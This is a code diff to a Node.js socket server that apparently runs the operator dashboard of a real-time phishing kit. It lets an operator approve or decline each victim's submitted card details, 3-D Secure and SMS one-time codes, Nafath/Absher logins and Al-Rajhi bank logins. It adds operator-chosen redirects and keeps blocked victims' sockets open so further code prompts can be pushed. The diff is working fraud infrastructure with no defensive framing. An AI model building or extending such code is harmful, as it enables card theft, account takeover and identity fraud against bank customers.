@@ -268,35 +268,83 @@ function recordSubmission(type, payload) {
 
 
 
+// Map admin-dashboard event names to the customer socket events the
+// site pages actually listen for (see /public/assets/index-*.js).
+// Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
+// and one of userId / uuid / id matching the visitor's session.
 const ADMIN_EVENT_ALIASES = {
-  acceptPaymentForm: ["payment:action", "confirmed"],
-  declinePaymentForm: ["payment:action", "cancelled"],
-  acceptVisaOtp: ["otp:action", "confirmed"],
-  declineVisaOtp: ["otp:action", "cancelled"],
-  acceptPhoneOtp: ["otp:action", "confirmed"],
-  declinePhoneOtp: ["otp:action", "cancelled"],
-  acceptPhone: ["phone:action", "confirmed"],
-  declinePhone: ["phone:action", "cancelled"],
-  acceptNavaz: ["nafath:action", "confirmed"],
-  declineNavaz: ["nafath:action", "cancelled"],
-  acceptService: ["payment:action", "confirmed"],
-  declineService: ["payment:action", "cancelled"],
+  // Payment / visa card form
+  acceptpaymentform: ["payment:action", "confirmed"],
+  declinepaymentform: ["payment:action", "cancelled"],
+  acceptservice: ["payment:action", "confirmed"],
+  declineservice: ["payment:action", "cancelled"],
+  acceptpayment: ["payment:action", "confirmed"],
+  declinepayment: ["payment:action", "cancelled"],
+
+  // Visa 3-D Secure / SMS OTP shown after payment
+  acceptvisaotp: ["otp:action", "confirmed"],
+  declinevisaotp: ["otp:action", "cancelled"],
+  acceptphoneotp: ["otp:action", "confirmed"],
+  declinephoneotp: ["otp:action", "cancelled"],
+  acceptotp: ["otp:action", "confirmed"],
+  declineotp: ["otp:action", "cancelled"],
+
+  // Phone verification (motasel / stc verify pages)
+  acceptphone: ["phone:action", "confirmed"],
+  declinephone: ["phone:action", "cancelled"],
+
+  // Nafath (Absher) approval step
+  acceptnavaz: ["nafath:action", "confirmed"],
+  declinenavaz: ["nafath:action", "cancelled"],
+  acceptnafath: ["nafath:action", "confirmed"],
+  declinenafath: ["nafath:action", "cancelled"],
+
+  // Nafath login (username + password) -> navigates to /nafse
+  acceptnaflogin: ["naflogin:action", "confirmed"],
+  declinenaflogin: ["naflogin:action", "cancelled"],
+  acceptnafselogin: ["naflogin:action", "confirmed"],
+  declinenafselogin: ["naflogin:action", "cancelled"],
+
+  // Al-Rajhi login -> navigates to /phone
+  acceptrajlogin: ["rajlogin:action", "confirmed"],
+  declinerajlogin: ["rajlogin:action", "cancelled"],
+  acceptrajhi: ["rajlogin:action", "confirmed"],
+  declinerajhi: ["rajlogin:action", "cancelled"],
 };
 
 function broadcastAdminEvent(id, event, payload) {
   if (!id) return;
   const target = io.to(`session:${id}`).to(`user:${id}`);
-  const data = payload ?? { id, uuid: id, userId: id };
+  const base = { id, uuid: id, userId: id };
+  const data = payload && typeof payload === "object"
+    ? { ...base, ...payload, id, uuid: id, userId: id }
+    : base;
+
+  // Echo the raw event too, so a dashboard that already uses the
+  // customer-side names keeps working.
   target.emit(event, data);
 
-  const alias = ADMIN_EVENT_ALIASES[event];
+  const key = String(event || "").toLowerCase();
+  const alias = ADMIN_EVENT_ALIASES[key];
   if (alias) {
     const [aliasEvent, action] = alias;
-    target.emit(aliasEvent, { ...data, userId: id, action });
-  } else if (event === "adminRedirect") {
-    target.emit("admin:redirect", data);
-  } else if (event === "clientBlocked") {
-    target.emit("user:blocked", data);
+    target.emit(aliasEvent, { ...data, action });
+  }
+
+  // Redirect: dashboard chooses the destination page.
+  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
+    const redirectPayload = {
+      ...data,
+      page: data.page || data.route || data.to || "/",
+      pageName: data.pageName || data.title || "",
+    };
+    target.emit("admin:redirect", redirectPayload);
+  }
+
+  // Block: customer page shows blocked screen. Do NOT disconnect the
+  // socket, otherwise the next OTP / redirect can't be delivered.
+  if (key === "clientblocked" || key === "blockclient" || key === "user:blocked") {
+    target.emit("user:blocked", { ...data, blocked: true });
   }
 
   io.to("admins").emit(`admin:${event}`, { id, payload: data });
@@ -306,7 +354,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v12";
+const APP_VERSION = "v13";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
